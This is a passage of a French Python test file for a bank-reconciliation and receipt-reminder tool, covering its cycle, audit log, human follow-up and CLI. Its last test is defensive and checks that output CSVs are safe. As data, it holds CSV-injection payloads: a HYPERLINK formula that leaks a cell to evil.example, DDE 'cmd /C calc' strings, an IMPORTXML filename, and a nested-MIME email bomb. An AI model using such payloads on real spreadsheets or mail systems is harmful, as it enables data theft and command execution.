    with pytest.raises(cycle.CollisionReferences) as exc:
        lancer(entree2, inst, jour(1))
    assert exc.value.collisions == {"A-002": ("ALPHA", "BETA")}
    assert etat_depot(inst) == avant


# ---------------------------------------------------------------------------
# Fusion : une piece connue garde son etat ou sort par l'evenement adequat
# ---------------------------------------------------------------------------


def test_piece_connue_garde_etat_et_compteurs(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    # Le mois suivant, le releve ne contient plus que de nouvelles operations.
    entree2 = ecrire_entree(tmp_path / "e2", operations=[
        ["ALPHA", "2026-10-02", "CB LEROY MERLIN", "99.00", "A-010"],
    ])
    lancer(entree2, inst, jour(3))
    pieces = pieces_par_ref(inst)
    assert len(pieces) == 6                                   # aucune piece perdue
    assert all(pieces[r].nb_relances == 1 for r in REFS_MANQUANTES)
    assert pieces["A-010"].etat is EtatPiece.ATTENDUE


def test_piece_connue_devenue_hors_perimetre_ou_justifiee(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    entree2 = ecrire_entree(
        tmp_path / "e2",
        exclusions=[["ALPHA", "loxam", "Location refacturee au client"]],
        pieces=[["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR",
                 "2026-10-06", "email"]],
    )
    r = lancer(entree2, inst, jour(7))
    pieces = pieces_par_ref(inst)
    assert pieces["A-001"].etat is EtatPiece.HORS_PERIMETRE and r.pieces_exclues == 1
    a002 = pieces["A-002"]
    assert a002.etat is EtatPiece.DEMANDEE and a002.bloquee
    assert a002.motif_blocage.startswith(cycle.PREFIXE_MOTIF_CYCLE)
    alpha = [b for b in cycle.brouillons(inst) if b.cree_le == jour(7) and "ALPHA" in b.dossiers]
    assert alpha and all("A-001" not in b.references and "A-002" not in b.references for b in alpha)
    with open(inst.sortie / "a_verifier.csv", encoding="utf-8") as f:
        assert "A-002" in {l["reference"] for l in csv.DictReader(f)}
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(7)), dossier="ALPHA",
                              reference="A-002", id_piece="P-77")
    assert p.etat is EtatPiece.RECUE and not p.bloquee
    assert cycle.controler_piece(inst, "ALPHA", "A-002", VALIDEUSE, conforme=True,
                                 maintenant=a_10h(jour(7))).etat is EtatPiece.VALIDEE


# ---------------------------------------------------------------------------
# Audit
# ---------------------------------------------------------------------------


def test_verifier_audit_detecte_une_alteration(entree, inst):
    lancer(entree, inst, J0)
    cli = charger_cli()
    base = ["verifier-audit", "--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cycle.verifier_audit(inst).ok and cli.main(base) == 0
    lignes = inst.audit.read_bytes().split(b"\n")
    lignes[2] = lignes[2].replace(b"ALPHA", b"ALFA", 1)
    assert lignes[2] != inst.audit.read_bytes().split(b"\n")[2]
    inst.audit.write_bytes(b"\n".join(lignes))
    r = cycle.verifier_audit(inst)
    assert not r.ok and r.premiere_erreur_seq == 3
    assert cli.main(base) == 1


def test_audit_apres_la_transaction(entree, inst, monkeypatch):
    """Une transaction annulee ne laisse aucune trace d'audit (jamais l'inverse)."""
    original = Depot.sauver_pieces

    def en_panne(self, pieces):
        raise Panne("pieces")

    monkeypatch.setattr(Depot, "sauver_pieces", en_panne)
    with pytest.raises(Panne):
        lancer(entree, inst, J0)
    # Rien de la transaction annulee n'est journalise ; seule trace : le mode fige par le premier cycle.
    assert [e.action for e in JournalAudit(inst.audit).lire()] == ["mode_instance"]
    monkeypatch.setattr(Depot, "sauver_pieces", original)


# ---------------------------------------------------------------------------
# Corpus de reference (ordre de grandeur)
# ---------------------------------------------------------------------------


def corpus_avec_circuit(destination: Path, circuit: str = "C-DIRECT") -> Path:
    """Copie du corpus dont `dossiers.csv` DECLARE le circuit (decision D6 : hors mode test, un
    circuit absent est refuse). Le contenu des autres fichiers est inchange."""
    shutil.copytree(RACINE / "data" / "corpus", destination)
    with open(destination / "dossiers.csv", newline="", encoding="utf-8") as f:
        lignes = list(csv.reader(f))
    if "circuit" not in lignes[0]:                       # le corpus fourni DECLARE deja son circuit
        lignes[0].append("circuit")
        for ligne in lignes[1:]:
            ligne.append(circuit)
    with open(destination / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        csv.writer(f, lineterminator="\n").writerows(lignes)
    return destination


def corpus_sans_circuit(destination: Path) -> Path:
    """Copie du corpus dont `dossiers.csv` est depouille de la colonne `circuit` (cas « circuit
    absent » de la decision D6). Les autres colonnes et fichiers sont inchanges."""
    shutil.copytree(RACINE / "data" / "corpus", destination)
    with open(destination / "dossiers.csv", newline="", encoding="utf-8") as f:
        lignes = list(csv.reader(f))
    colonne = lignes[0].index("circuit")
    with open(destination / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        csv.writer(f, lineterminator="\n").writerows([ligne[:colonne] + ligne[colonne + 1:] for ligne in lignes])
    return destination


def test_corpus_de_reference(tmp_path):
    entree = corpus_avec_circuit(tmp_path / "entree_corpus")
    inst = nouvelle_instance(tmp_path / "corpus")
    r = lancer(entree, inst, J0)
    assert r.operations == 284 and r.manquants == 23 and r.pieces_creees == 23
    assert r.a_verifier == 8 and r.brouillons_crees == 3 and r.anomalies == []
    assert emls(inst) == []
    with open(inst.sortie / "a_verifier.csv", encoding="utf-8") as f:
        a_verif = {l["reference"] for l in csv.DictReader(f)}
    assert len(a_verif) == 8
    references_reclamees = {ref for b in cycle.brouillons(inst) for ref in b.references}
    assert not a_verif & references_reclamees                 # PARTIEL / A_VERIFIER jamais relances
    assert not a_verif & set(pieces_par_ref(inst))
    assert verifier_ca07(entree, inst) == 23


def test_envoi_parti_puis_piece_justifiee_avant_la_repercussion(entree, tmp_path, inst):
    """Crash apres l'envoi, puis le moteur justifie la piece : l'envoi est quand meme compte."""
    lancer(entree, inst, J0)
    b = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))

    def panne(p: str) -> None:
        raise Panne(p)

    with pytest.raises(Panne):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), panne=panne)
    entree2 = ecrire_entree(tmp_path / "e2", pieces=[
        ["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR", "2026-10-06", "email"],
    ])
    r = lancer(entree2, inst, jour(1))
    a002 = pieces_par_ref(inst)["A-002"]
    assert not [a for a in r.anomalies if "repercute" in a] and r.envois_repercutes == 1
    assert (a002.etat, a002.nb_relances, a002.bloquee) == (EtatPiece.DEMANDEE, 1, True)


# ---------------------------------------------------------------------------
# CA-03 et CA-11 au travers de l'assemblage
# ---------------------------------------------------------------------------


def test_ca03_jamais_de_rattachement_inter_dossiers(entree, inst):
    lancer(entree, inst, J0)
    # Le montant ne correspond qu'a une piece de BETA, mais l'expediteur est ALPHA.
    ecrire_eml(inst.entrant, "x.eml", expediteur="compta@alpha-sarl.fr", message_id="<x@a>",
               corps="Facture 230,40 EUR", fichiers=(("metro_2026-09-10.pdf", b"%PDF-x"),))
    lancer(entree, inst, jour(1))
    (d,) = cycle.lister_file(inst)
    assert d.statut is StatutRoutage.NON_ROUTEE and d.dossier == "ALPHA"
    assert d.reference_operation is None
    with pytest.raises(cycle.ErreurCycle):                     # NON_ROUTEE : pas de confirmation implicite
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id)


def test_ca11_export_complet_relu_sans_perte(entree, inst, tmp_path):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    chemin = cycle.exporter(inst, tmp_path / "export.json")
    copie = nouvelle_instance(tmp_path / "copie")
    with Depot(copie.depot) as d:
        d.importer_json(chemin)
    assert etat_depot(copie) == etat_depot(inst)


# ---------------------------------------------------------------------------
# Defauts trouves a l'integration. Les trois premiers sont corriges : leurs tests
# sont devenus des tests de regression. Les xfail stricts restants sont des
# limites ASSUMEES et documentees (docs/architecture_mvp.md, section 7).
# ---------------------------------------------------------------------------


def test_regression_relance_mixte_affirme_une_demande_qui_n_a_pas_eu_lieu():
    dossiers = {"A": Dossier("A", "Alpha SARL", "compta@alpha.fr", "M. Alpha")}
    j7 = J0 + dt.timedelta(days=7)
    deja = PieceAttendue("R1", "A", "2026-09", Decimal("120.00"), dt.date(2026, 9, 3), "CB LOXAM",
                         etat=EtatPiece.DEMANDEE, nb_relances=1, date_premiere_demande=J0,
                         date_derniere_relance=J0)
    neuve = PieceAttendue("R2", "A", "2026-10", Decimal("80.00"), dt.date(2026, 10, 8), "CB BUREAU VALLEE")
    plan = planifier([deja, neuve], dossiers, [], j7)
    (planifiee,) = plan.relances
    b = relances.construire_brouillon(planifiee, {"R1": deja, "R2": neuve}, dossiers, j7)
    affirme_demande = "demandes le" in b.corps
    assert not (affirme_demande and "BUREAU VALLEE" in b.corps.split("demandes le", 1)[1])


def test_regression_envoi_sans_garde_fou_hebdomadaire(tmp_path):
    depot = Depot(":memory:")
    journal = JournalAudit(tmp_path / "audit.jsonl")
    ids = []
    for refs in (("R1",), ("R2",)):
        b = Brouillon(identifiant_relance("c@x.fr", refs, 1, J0), "c@x.fr", "objet", "corps",
                      ("A",), refs, 1, J0)
        depot.sauver_brouillon(b)
        envoi.valider(depot, journal, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
        ids.append(b.id_relance)
    expediteur = envoi.ExpediteurDossier(tmp_path / "outbox")
    envoi.envoyer(depot, journal, expediteur, ids[0], maintenant=a_10h(J0))
    with pytest.raises(envoi.EnvoiNonValide):
        envoi.envoyer(depot, journal, expediteur, ids[1], maintenant=a_10h(J0))


def test_regression_parseurs_reference_de_repli_instable(tmp_path):
    inst = nouvelle_instance(tmp_path / "i")
    sept = ecrire_entree(tmp_path / "sept", operations=[["ALPHA", "2026-09-03", "CB LOXAM", "120.00", ""]])
    octo = ecrire_entree(tmp_path / "oct", operations=[["ALPHA", "2026-10-02", "CB CASTORAMA", "45.00", ""]])
    lancer(sept, inst, J0)
    lancer(octo, inst, jour(7))
    assert len(cycle.pieces(inst)) == 2


# ---------------------------------------------------------------------------
# Limites ASSUMEES (voir docs/architecture_mvp.md, section 7). xfail strict : le
# jour ou l'une est corrigee, le test devient rouge et rappelle de retirer le
# marqueur.
# ---------------------------------------------------------------------------


@pytest.mark.xfail(strict=True, reason=(
    "moteur.py : Moteur.rapprocher indexe `resultats` par reference seule ; deux "
    "operations de dossiers differents partageant une reference se confondent. "
    "Le cycle refuse donc les collisions AVANT le moteur. Correction prevue : cle "
    "composite (dossier, reference)."
))
def test_defaut_moteur_collision_de_reference_entre_dossiers():
    from rapprochement.modeles import OperationBancaire, Sens
    from rapprochement.moteur import Moteur

    def operation(dossier: str) -> OperationBancaire:
        return OperationBancaire(
            reference="R1",
            dossier=dossier,
            date_operation=dt.date(2026, 4, 12),
            libelle="PRLV ORANGE",
            montant=Decimal("89.90"),
            sens=Sens.DEBIT,
        )

    resultats = Moteur().rapprocher([operation("A"), operation("B")], [])
    assert sorted((r.operation.dossier, r.operation.reference) for r in resultats) == [
        ("A", "R1"),
        ("B", "R1"),
    ]


@pytest.mark.xfail(strict=True, reason=(
    "depot.py : marquer_vu horodate `vus.vu_le` avec l'horloge murale (_maintenant), "
    "sans parametre, et exporter_json exporte vu_le : deux depots alimentes des "
    "memes donnees produisent des exports differents (CA-08 non tenu pour "
    "`exporter`)."
))
def test_defaut_depot_export_non_reproductible(tmp_path, monkeypatch):
    import rapprochement.depot as depot_module

    exports = []
    for numero, instant in enumerate(
        (dt.datetime(2026, 4, 12, 9, 0, tzinfo=dt.timezone.utc),
         dt.datetime(2026, 4, 12, 9, 0, 7, tzinfo=dt.timezone.utc))
    ):
        monkeypatch.setattr(depot_module, "_maintenant", lambda instant=instant: instant)
        depot = Depot(tmp_path / f"depot{numero}.sqlite")
        depot.marquer_vu("cle-identique")
        chemin = depot.exporter_json(tmp_path / f"export{numero}.json")
        exports.append(Path(chemin).read_bytes())
        depot.fermer()
    assert exports[0] == exports[1]


# ---------------------------------------------------------------------------
# Suivi humain : promesse, arbitrage, blocage, liste des pieces
# ---------------------------------------------------------------------------


def actions_audit(inst: cycle.Instance) -> list[str]:
    return [e.action for e in JournalAudit(inst.audit).lire()]


def amener_a_l_escalade(entree: Path, inst: cycle.Instance) -> None:
    for n in (0, 7, 14):
        lancer(entree, inst, jour(n))
        valider_et_envoyer(inst, jour(n))
    lancer(entree, inst, jour(18))
    assert _etats(inst) == {(EtatPiece.ESCALADEE, 3)}


def cli(capsys, inst: cycle.Instance, commande: str, *args: str, date: dt.date | None = J0):
    options = ["--instance", str(inst.racine)]
    if date is not None:
        options += (["--le"] if commande == "promesse" else ["--date"]) + [date.isoformat()]
    rc = charger_cli().main([commande, *options, *args])
    sortie = capsys.readouterr()
    assert "Traceback" not in sortie.out + sortie.err
    return rc, sortie.out, sortie.err


def test_arbitrer_escaladee_jusqu_a_periode_complete(entree, inst):
    amener_a_l_escalade(entree, inst)
    suivi = cycle.suivi_pieces(inst, jour(18), etat="escaladee")
    assert len(suivi.lignes) == 5 and all("arbitrage" in l.action for l in suivi.lignes)
    p = cycle.arbitrer_piece(inst, "ALPHA", "A-003", "paul martin",
                             motif="Fournisseur liquide, montant non significatif",
                             maintenant=a_10h(jour(18)))
    assert p.etat is EtatPiece.CLOSE_SANS_SUITE
    toutes = cycle.pieces(inst)
    aout = [x for x in toutes if (x.dossier, x.periode) == ("ALPHA", "2026-08")]
    sept = [x for x in toutes if (x.dossier, x.periode) == ("ALPHA", "2026-09")]
    assert etats.etat_periode(aout) is EtatPeriode.COMPLETE
    assert etats.etat_periode(sept) is EtatPeriode.EN_COLLECTE
    periodes = {(d, per): e for d, per, e in cycle.suivi_pieces(inst, jour(18)).periodes}
    assert periodes[("ALPHA", "2026-08")] is EtatPeriode.COMPLETE

    journal = JournalAudit(inst.audit).lire()
    (arbitrage,) = [e for e in journal if e.action == "arbitrage"]
    assert arbitrage.acteur == "Paul Martin" and arbitrage.objet == "ALPHA/A-003"
    assert arbitrage.details["motif"].startswith("Fournisseur liquide")
    n = len(journal)
    cycle.arbitrer_piece(inst, "ALPHA", "A-003", RESPONSABLE, motif="rejeu",
                         maintenant=a_10h(jour(18)))                   # rejeu : sans effet
    assert len(JournalAudit(inst.audit).lire()) == n

    lancer(entree, inst, jour(21))
    assert [l["reference"] for l in lire_csv(inst.sortie / "escalades.csv")] == [
        "A-001", "A-002", "B-001", "G-001"]
    periodes_csv = {(l["dossier"], l["periode"]): l["etat"] for l in lire_csv(inst.sortie / "periodes.csv")}
    assert periodes_csv[("ALPHA", "2026-08")] == "complete"
    assert JournalAudit(inst.audit).verifier().ok


def test_arbitrer_refus(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    avant, journal_avant = etat_depot(inst), actions_audit(inst)
    m = a_10h(J0)
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", "Mallory", motif="x", maintenant=m)
    with pytest.raises(cycle.ErreurCycle, match="introuvable"):
        cycle.arbitrer_piece(inst, "ALPHA", "Z-999", RESPONSABLE, motif="x", maintenant=m)
    with pytest.raises(cycle.ErreurCycle, match="motif"):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", RESPONSABLE, motif="  ", maintenant=m)
    with pytest.raises(etats.TransitionInterdite, match="arbitrage_classement interdit depuis demandee"):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", RESPONSABLE, motif="x", maintenant=m)
    assert etat_depot(inst) == avant and actions_audit(inst) == journal_avant


def test_promesse_puis_retour_en_demandee_trois_jours_ouvres_apres(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    promise_le = dt.date(2026, 10, 9)                                  # vendredi
    p = cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=promise_le,
                              maintenant=a_10h(jour(2)))
    assert (p.etat, p.date_promesse) == (EtatPiece.PROMISE, promise_le)
    (entree_audit,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "promesse_saisie"]
    assert entree_audit.acteur == VALIDEUSE
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, jour(2)).lignes}
    assert suivi["A-001"].echeance == dt.date(2026, 10, 14)            # J+3 ouvres apres la date
    assert "promesse" in suivi["A-001"].action

    lancer(entree, inst, jour(7))                                      # lundi 12 : relance des autres
    nouveaux = [b for b in cycle.brouillons(inst) if b.cree_le == jour(7)]
    assert nouveaux and all("A-001" not in b.references for b in nouveaux)
    lancer(entree, inst, dt.date(2026, 10, 13))                        # 2e jour ouvre : encore promise
    assert pieces_par_ref(inst)["A-001"].etat is EtatPiece.PROMISE
    r = lancer(entree, inst, dt.date(2026, 10, 14))                    # 3e jour ouvre : retour
    a001 = pieces_par_ref(inst)["A-001"]
    assert r.transitions == 1
    assert (a001.etat, a001.date_promesse, a001.nb_relances) == (EtatPiece.DEMANDEE, None, 1)


def test_promesse_refus_et_rejeu(entree, inst):
    lancer(entree, inst, J0)
    m = a_10h(J0)
    with pytest.raises(etats.TransitionInterdite, match="promesse_saisie interdit depuis attendue"):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    valider_et_envoyer(inst, J0)
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", "bot", date_promesse=jour(3), maintenant=m)
    with pytest.raises(cycle.ErreurCycle, match="introuvable"):
        cycle.saisir_promesse(inst, "BETA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    with pytest.raises(etats.TransitionInterdite, match="hors de"):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(20), maintenant=m)
    cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    n = len(actions_audit(inst))
    cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    assert len(actions_audit(inst)) == n                               # rejeu : sans effet
    with pytest.raises(etats.TransitionInterdite):                     # autre date : refus clair
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(4), maintenant=m)


def test_promesse_impossible_sur_une_piece_escaladee(entree, inst):
    """Constat (etats) : une fois ESCALADEE, une promesse obtenue par le responsable
    ne peut pas etre enregistree ; seuls arbitrer, rattacher ou exclure restent."""
    amener_a_l_escalade(entree, inst)
    with pytest.raises(etats.TransitionInterdite, match="promesse_saisie interdit depuis escaladee"):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(20),
                              maintenant=a_10h(jour(18)))


def test_bloquer_puis_debloquer(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    m3 = a_10h(jour(3))
    p = cycle.bloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="Litige fournisseur", maintenant=m3)
    assert p.bloquee and p.motif_blocage == "Litige fournisseur"
    n = len(actions_audit(inst))
    cycle.bloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="Litige fournisseur", maintenant=m3)
    assert len(actions_audit(inst)) == n                               # rejeu : sans effet
    with pytest.raises(etats.TransitionInterdite, match="bloquee"):
        cycle.bloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="autre", maintenant=m3)
    with pytest.raises(cycle.ErreurCycle, match="reserve"):
        cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="[cycle] faux", maintenant=m3)
    with pytest.raises(cycle.ErreurCycle, match="motif"):
        cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="", maintenant=m3)
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.debloquer_piece(inst, "ALPHA", "A-002", "Inconnu", motif="x", maintenant=m3)
    with pytest.raises(cycle.ErreurCycle, match="introuvable"):
        cycle.bloquer_piece(inst, "ALPHA", "NOPE", VALIDEUSE, motif="x", maintenant=m3)

    r7 = lancer(entree, inst, jour(7))                                 # bloquee : pas relancee
    (alpha,) = [b for b in cycle.brouillons(inst) if b.cree_le == jour(7) and "ALPHA" in b.dossiers]
    assert alpha.references == ("A-001", "A-003") and r7.bloquees == 1
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, jour(7)).lignes}
    assert suivi["A-002"].echeance is None and "Litige fournisseur" in suivi["A-002"].action
    valider_et_envoyer(inst, jour(7))

    with pytest.raises(cycle.ErreurCycle, match="motif"):
        cycle.debloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif=" ", maintenant=a_10h(jour(7)))
    p = cycle.debloquer_piece(inst, "ALPHA", "A-002", "Paul Martin", motif="Litige regle",
                              maintenant=a_10h(jour(7)))
    assert not p.bloquee and p.motif_blocage == ""
    n = len(actions_audit(inst))
    cycle.debloquer_piece(inst, "ALPHA", "A-002", "Paul Martin", motif="Litige regle",
                          maintenant=a_10h(jour(7)))
    assert len(actions_audit(inst)) == n
    lancer(entree, inst, jour(14))                                     # de nouveau relancee
    assert any("A-002" in b.references for b in cycle.brouillons(inst) if b.cree_le == jour(14))
    acteurs = {(e.action, e.acteur) for e in JournalAudit(inst.audit).lire()}
    assert ("blocage", VALIDEUSE) in acteurs and ("deblocage", "Paul Martin") in acteurs


def test_debloquer_un_blocage_du_cycle_est_respecte(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    entree2 = ecrire_entree(tmp_path / "e2", pieces=[
        ["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR", "2026-10-06", "email"],
    ])
    lancer(entree2, inst, jour(7))
    assert pieces_par_ref(inst)["A-002"].bloquee
    cycle.debloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="P-77 concerne une autre facture",
                          maintenant=a_10h(jour(7)))
    lancer(entree2, inst, jour(8))
    assert not pieces_par_ref(inst)["A-002"].bloquee


def test_pieces_lecture_seule_triee_et_echeances(entree, tmp_path, capsys):
    inst = nouvelle_instance(tmp_path / "sans_validateurs", validateurs=None)
    assert cycle.suivi_pieces(inst, J0).lignes == ()                    # instance vide
    lancer(entree, inst, J0)
    suivi = cycle.suivi_pieces(inst, J0)
    assert all("brouillon" in l.action for l in suivi.lignes)           # brouillons a valider
    avant, audit_avant = etat_depot(inst), inst.audit.read_bytes()
    rc, sortie1, _ = cli(capsys, inst, "pieces")
    rc2, sortie2, _ = cli(capsys, inst, "pieces")
    assert rc == rc2 == 0 and sortie1 == sortie2
    assert etat_depot(inst) == avant and inst.audit.read_bytes() == audit_avant
    lignes = [l for l in sortie1.splitlines() if l.startswith("  ") and "EUR" in l]
    assert [l.split()[1] for l in lignes] == ["A-003", "A-001", "A-002", "B-001", "G-001"]
    assert "ALPHA          2026-08 en_collecte" in sortie1

    rc, sortie, _ = cli(capsys, inst, "pieces", "--dossier", "BETA")
    assert rc == 0 and "B-001" in sortie and "A-001" not in sortie and "GAMMA" not in sortie
    rc, sortie, _ = cli(capsys, inst, "pieces", "--etat", "escaladee")
    assert rc == 0 and "Pieces attendues au 2026-10-05 : 0" in sortie
    rc, _, err = cli(capsys, inst, "pieces", "--etat", "perdue")
    assert rc == 1 and "etat inconnu" in err


def test_echeances_coherentes_avec_le_cycle(entree, inst):
    """L'echeance annoncee est le jour ou le cycle agit reellement."""
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, J0).lignes}
    assert suivi["A-001"].echeance == jour(7) and suivi["A-001"].action == "relance niveau 2"
    for n in (7, 14):
        lancer(entree, inst, jour(n))
        valider_et_envoyer(inst, jour(n))
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, jour(14)).lignes}
    assert {(l.echeance, l.action) for l in suivi.values()} == {(jour(18), "escalade au responsable")}
    assert lancer(entree, inst, jour(17)).transitions == 0
    assert lancer(entree, inst, jour(18)).transitions == 5


def test_cli_suivi_humain(entree, inst, capsys):
    amener_a_l_escalade(entree, inst)
    j = jour(18)
    piece = ["--dossier", "ALPHA", "--reference"]
    # arbitrer
    assert cli(capsys, inst, "arbitrer", *piece, "A-003", "--motif", "x", "--par", "Mallory", date=j)[0] == 1
    rc, _, err = cli(capsys, inst, "arbitrer", *piece, "Z-9", "--motif", "x", "--par", RESPONSABLE, date=j)
    assert rc == 1 and "introuvable" in err
    rc, _, err = cli(capsys, inst, "arbitrer", *piece, "A-003", "--motif", "", "--par", RESPONSABLE, date=j)
    assert rc == 1 and "motif" in err
    rc, out, _ = cli(capsys, inst, "arbitrer", *piece, "A-003", "--motif", "classe", "--par", RESPONSABLE, date=j)
    assert rc == 0 and "close_sans_suite" in out
    rc, _, err = cli(capsys, inst, "arbitrer", "--dossier", "BETA", "--reference", "B-001",
                     "--motif", "x", "--par", RESPONSABLE, date=j)
    assert rc == 0
    # bloquer / debloquer sur une piece escaladee
    rc, out, _ = cli(capsys, inst, "bloquer", *piece, "A-001", "--motif", "litige", "--par", VALIDEUSE, date=j)
    assert rc == 0 and "(bloquee)" in out
    rc, _, err = cli(capsys, inst, "bloquer", *piece, "A-001", "--motif", "autre", "--par", VALIDEUSE, date=j)
    assert rc == 1 and "REFUS (TransitionInterdite)" in err
    assert cli(capsys, inst, "debloquer", *piece, "A-001", "--motif", "ok", "--par", "X", date=j)[0] == 1
    rc, out, _ = cli(capsys, inst, "debloquer", *piece, "A-001", "--motif", "ok", "--par", VALIDEUSE, date=j)
    assert rc == 0 and "(bloquee)" not in out
    rc, _, err = cli(capsys, inst, "bloquer", *piece, "A-404", "--motif", "x", "--par", VALIDEUSE, date=j)
    assert rc == 1 and "introuvable" in err
    # promesse : --date est la date promise, --le le jour courant
    rc, _, err = cli(capsys, inst, "promesse", *piece, "A-002", "--date", "2026-10-26",
                     "--par", VALIDEUSE, date=j)
    assert rc == 1 and "promesse_saisie interdit depuis escaladee" in err
    assert cli(capsys, inst, "promesse", *piece, "A-002", "--date", "2026-10-26",
               "--par", "Mallory", date=j)[0] == 1
    assert cli(capsys, inst, "promesse", *piece, "Z-1", "--date", "2026-10-26",
               "--par", VALIDEUSE, date=j)[0] == 1
    with pytest.raises(SystemExit):                                    # date illisible : argparse
        charger_cli().main(["promesse", "--instance", str(inst.racine), *piece, "A-002",
                            "--date", "2026-13-40", "--par", VALIDEUSE])
    with pytest.raises(SystemExit):                                    # --par obligatoire
        charger_cli().main(["arbitrer", "--instance", str(inst.racine), *piece, "A-002", "--motif", "x"])
    # pieces : l'etat calcule des periodes suit
    rc, out, _ = cli(capsys, inst, "pieces", date=j)
    assert rc == 0 and "ALPHA          2026-08 complete" in out and "BETA           2026-09 complete" in out
    assert JournalAudit(inst.audit).verifier().ok


def test_cli_promesse_succes(entree, inst, capsys):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    rc, out, _ = cli(capsys, inst, "promesse", "--dossier", "ALPHA", "--reference", "A-001",
                     "--date", "2026-10-09", "--par", "marie durand", date=jour(2))
    assert rc == 0 and "promise le 2026-10-09" in out
    rc, _, err = cli(capsys, inst, "promesse", "--dossier", "ALPHA", "--reference", "A-002",
                     "--date", "2026-12-01", "--par", VALIDEUSE, date=jour(2))
    assert rc == 1 and "hors de" in err


# ---------------------------------------------------------------------------
# Durcissement apres la revue adversariale (attaques reelles)
# ---------------------------------------------------------------------------

DECLENCHEURS = ("=", "+", "-", "@", "\t", "\r")


def _cellules_dangereuses(chemin: Path) -> list[str]:
    with open(chemin, encoding="utf-8", newline="") as f:
        cellules = [c for ligne in csv.reader(f) for c in ligne]
    return [c for c in cellules if c.startswith(DECLENCHEURS) and not _est_nombre(c)]


def _est_nombre(c: str) -> bool:
    try:
        Decimal(c)
    except Exception:
        return False
    return True


def _imbrique(n: int) -> bytes:
    corps = b"Content-Type: text/plain\r\n\r\nx\r\n"
    for _ in range(n):
        corps = b"Content-Type: message/rfc822\r\n\r\n" + corps
    return b"From: inconnu@evil.example\r\nMessage-ID: <bombe@x>\r\nMIME-Version: 1.0\r\n" + corps


def test_aucune_formule_de_tableur_dans_les_csv_du_cycle(tmp_path):
    formule = '=HYPERLINK("https://evil.example/?d="&A2,"Voir")'
    entree = ecrire_entree(tmp_path / "e", operations=[
        ["ALPHA", "2026-09-03", formule, "120.00", "A-001"],
        ["BETA", "2026-09-10", "@SUM(1+1)*cmd|' /C calc'!A0", "230.40", "B-001"],
    ])
    with open(entree / "releve_bancaire.csv", "a", newline="", encoding="utf-8") as f:
        csv.writer(f).writerow(["ALPHA", "2026-09-05", "2026-09-05", "+cmd|' /C calc'!A0", "",
                                "15.00", "EUR", "A-009"])       # credit -> a_verifier
    inst = nouvelle_instance(tmp_path / "i")
    with Depot(inst.depot) as d:                                  # piece escaladee piegee
        d.sauver_pieces([PieceAttendue(
            "G-001", "GAMMA", "2026-09", Decimal("145.00"), dt.date(2026, 9, 11), "-2+3*cmd",
            etat=EtatPiece.ESCALADEE, nb_relances=3, date_premiere_demande=dt.date(2026, 9, 14))])
    ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@evil.example", message_id="<p@x>",
               fichiers=(('=IMPORTXML(CONCAT("https:",B2),"a").pdf', b"%PDF"),))
    (inst.entrant / "=bombe.eml").write_bytes(_imbrique(1000))   # nom piege en quarantaine
    lancer(entree, inst, J0)
    fichiers = sorted(inst.sortie.glob("*.csv"))
    assert {f.name for f in fichiers} >= {"pieces_attendues.csv", "a_verifier.csv", "escalades.csv",
                                          "file_humaine.csv", "quarantaine.csv", "tableau_suivi.csv",
                                          "periodes.csv"}
    for f in fichiers:
        assert _cellules_dangereuses(f) == [], f.name
